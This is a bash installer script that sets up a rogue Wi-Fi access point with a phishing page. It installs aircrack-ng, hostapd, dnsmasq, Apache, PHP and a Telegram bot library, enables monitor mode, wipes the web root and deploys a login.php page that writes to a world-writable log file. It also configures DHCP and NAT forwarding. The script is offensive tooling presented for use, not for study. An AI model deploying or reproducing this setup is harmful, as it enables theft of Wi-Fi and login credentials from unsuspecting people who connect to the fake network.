#!/bin/bash

echo "[+] Updating and installing dependencies..."
sudo apt update -y
sudo apt upgrade -y
sudo apt install -y aircrack-ng hostapd dnsmasq apache2 php python3-pip net-tools iw

echo "[+] Installing Python modules..."
pip3 install scapy telebot requests

echo "[+] Checking network interface..."
INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)

if [ -z "$INTERFACE" ]; then
    echo "[!] No wireless interface found. Please check your WiFi adapter."
    exit 1
else
    echo "[+] Using interface: $INTERFACE"
fi

echo "[+] Enabling monitor mode..."
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE

MON_INTERFACE="${INTERFACE}mon"

if [[ $(iwconfig 2>/dev/null | grep "$MON_INTERFACE") ]]; then
    echo "[+] Monitor mode enabled on: $MON_INTERFACE"
else
    echo "[!] Failed to enable monitor mode. Exiting..."
    exit 1
fi

echo "[+] Configuring Apache web server..."
sudo systemctl stop apache2
sudo rm -rf /var/www/html/*
sudo cp index.html /var/www/html/index.html
sudo cp login.php /var/www/html/login.php
sudo chmod 777 /var/www/html/log.txt
sudo systemctl start apache2
sudo systemctl enable apache2

echo "[+] Configuring DHCP..."
echo "interface=$MON_INTERFACE
dhcp-range=192.168.1.2,192.168.1.100,12h" | sudo tee /etc/dnsmasq.conf

echo "[+] Configuring IP forwarding..."
echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

echo "[+] Installation complete!"
